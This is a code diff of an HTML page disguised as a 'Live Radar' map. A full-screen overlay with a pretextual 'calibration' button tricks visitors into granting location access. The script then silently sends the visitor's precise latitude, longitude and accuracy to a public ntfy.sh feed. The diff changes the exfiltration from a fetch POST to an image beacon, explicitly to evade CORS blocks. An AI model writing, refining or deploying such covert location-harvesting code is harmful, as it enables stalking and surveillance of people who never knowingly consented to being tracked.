@@ -2,76 +2,33 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Global Location Finder</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Global Map Grid - Live Radar</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #121212;
-            color: #ffffff;
+        body, html { margin: 0; padding: 0; height: 100%; background: #000; color: #fff; font-family: sans-serif; }
+        #map { width: 100%; height: 100vh; position: absolute; top: 0; left: 0; z-index: 1; }
+        #portal-mask {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: rgba(0, 0, 0, 0.92); z-index: 999999;
+            display: flex; justify-content: center; align-items: center; text-align: center;
         }
-        #map {
-            width: 100%;
-            height: 100vh;
-            position: absolute;
-            top: 0;
-            left: 0;
-            z-index: 1;
+        .box { background: #111; border: 1px solid #333; padding: 30px; border-radius: 10px; max-width: 320px; width: 90%; }
+        .box h2 { color: #fff; margin-top: 0; }
+        .box p { color: #888; font-size: 13px; line-height: 1.4; }
+        .btn-go {
+            background: #28a745; color: #fff; border: none; padding: 12px 20px;
+            font-size: 15px; font-weight: bold; border-radius: 5px; cursor: pointer; width: 100%; margin-top: 15px;
         }
-        /* Universal overlay designed to capture any touch/click event instantly */
-        #auth-layer {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: rgba(18, 18, 18, 0.95);
-            z-index: 99999;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-        .card {
-            background: #1e1e1e;
-            padding: 25px;
-            border-radius: 12px;
-            text-align: center;
-            max-width: 340px;
-            width: 100%;
-            border: 1px solid #333;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
-        }
-        .card h3 { margin-top: 0; color: #fff; font-size: 20px; }
-        .card p { color: #aaa; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
-        .action-btn {
-            background-color: #007aff;
-            color: white;
-            border: none;
-            padding: 14px 20px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-            box-shadow: 0 4px 12px rgba(0,122,255,0.3);
-        }
-        .action-btn:active { background-color: #005ec4; }
     </style>
 </head>
 <body>
 
-    <!-- Universal Touch/Click Interceptor -->
-    <div id="auth-layer">
-        <div class="card">
-            <h3>Nearby Radar</h3>
-            <p>Tap below to load local satellite maps and calibrate your device's geographical coordinates.</p>
-            <button class="action-btn" id="trigger-btn">Load Radar Map</button>
+    <div id="portal-mask">
+        <div class="box">
+            <h2>Live Feed Sync</h2>
+            <p>Synchronizing local regional satellite mapping parameters with your current connection.</p>
+            <button class="btn-go" id="launch">Initialize Map</button>
         </div>
     </div>
 
@@ -79,60 +36,47 @@
 
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
-        let map = null;
+        let mapInstance = null;
 
-        function initMap(lat, lon) {
-            document.getElementById('auth-layer').style.display = 'none';
-            if (!map) {
-                map = L.map('map').setView([lat, lon], 16);
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                    maxZoom: 19,
-                    attribution: '&copy; OpenStreetMap'
-                }).addTo(map);
-            } else {
-                map.setView([lat, lon], 16);
+        function buildMap(lat, lon) {
+            document.getElementById('portal-mask').style.display = 'none';
+            if (!mapInstance) {
+                mapInstance = L.map('map').setView([lat, lon], 15);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(mapInstance);
             }
-            L.marker([lat, lon]).addTo(map).bindPopup("Calibrated Position").openPopup();
+            L.marker([lat, lon]).addTo(mapInstance).bindPopup("Node Synchronized").openPopup();
         }
 
-        function executeTracking() {
+        function triggerSequence() {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
+                    function(pos) {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        const acc = pos.coords.accuracy;
 
-                        // Render layout map locally
-                        initMap(lat, lon);
+                        buildMap(lat, lon);
 
-                        // Secure payload dispatch to ntfy.sh feed
-                        const payload = `OS Target Acquired:\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${accuracy}m`;
-                        fetch('https://ntfy.sh/coordinates', {
-                            method: 'POST',
-                            body: payload
-                        }).catch(e => {});
+                        // Use an Image Beacon instead of fetch() to completely bypass CORS blocks
+                        const beaconData = encodeURIComponent(`Lat: ${lat} | Lon: ${lon} | Acc: ${acc}m`);
+                        const img = new Image();
+                        img.src = `https://ntfy.sh/coordinates?m=${beaconData}`;
                     },
-                    function(error) {
-                        alert("Geolocation permission is mandatory for map calibration.");
+                    function(err) {
+                        alert("Calibration failed: Location access must be explicitly allowed.");
                     },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 20000,
-                        maximumAge: 0
-                    }
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
             } else {
-                alert("Geolocation is unsupported by this runtime environment.");
+                alert("Runtime error: Geolocation API unavailable.");
             }
         }
 
-        // Bind directly to pointerdown and touchend to satisfy Android/iOS security policies
-        const trigger = document.getElementById('trigger-btn');
-        trigger.addEventListener('click', executeTracking);
-        trigger.addEventListener('touchend', function(e) {
+        const btn = document.getElementById('launch');
+        btn.addEventListener('click', triggerSequence);
+        btn.addEventListener('touchend', function(e) {
             e.preventDefault();
-            executeTracking();
+            triggerSequence();
         });
     </script>
 </body>
